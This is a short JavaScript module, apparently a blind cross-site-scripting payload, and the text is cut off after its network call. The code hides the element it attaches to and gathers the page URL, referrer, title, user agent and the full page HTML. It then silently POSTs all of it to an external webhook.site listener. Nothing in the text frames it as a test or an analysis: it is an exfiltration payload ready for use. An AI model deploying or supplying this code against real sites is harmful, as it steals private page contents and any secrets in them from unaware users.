const LISTENER = 'https://webhook.site/83e26cc8-e798-40aa-96cf-16476f0fa527';

export default function (el) {
  try { el.style.display = 'none'; } catch (e) {}
  const data = {
    url: location.href,
    origin: location.origin,
    referrer: document.referrer,
    title: document.title,
    userAgent: navigator.userAgent,
    dom: document.documentElement.outerHTML
  };
  fetch(LISTENER, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: JSON.stringify(data) })
   
